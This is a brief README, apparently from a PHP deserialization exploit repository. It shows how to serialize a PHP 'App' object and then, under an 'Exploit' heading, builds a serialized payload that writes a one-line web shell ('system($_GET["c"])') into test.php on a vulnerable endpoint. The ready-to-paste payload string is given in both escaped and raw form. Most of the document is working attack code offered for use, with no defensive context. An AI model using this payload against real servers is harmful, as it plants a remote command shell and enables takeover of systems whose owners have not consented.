# phpDeserilization

# Find vulnerable endpoint!!

## Usage

*Testing*
deseralize.php
```php
<?php

class App
{
    public $logfile = 'logs.txt';
    public $logData = 'text';
}

$test = new App;

echo serialize($test);
```

Run deseralize.php, eg: 
```php
O:3:"App":2:{s:7:"logfile";s:8:"logs.txt";s:7:"logData";s:4:"text";}
```
To seralize the object/class


# Exploit 

```php
<?php

class App
{
    public $logfile = 'test.php';
    public $logData = '<?php system($_GET["c"]);?>';
}

$test = new App;

echo htmlspecialchars(serialize($test));

```
Output:
```php
O:3:&quot;App&quot;:2:{s:7:&quot;logfile&quot;;s:8:&quot;test.php&quot;;s:7:&quot;logData&quot;;s:27:&quot;&lt;?php system($_GET[&quot;c&quot;]);?&gt;&quot;;}
#From html entity
O:3:"App":2:{s:7:"logfile";s:8:"test.php";s:7:"logData";s:27:"<?php system($_GET["c"]);?>";} 
```

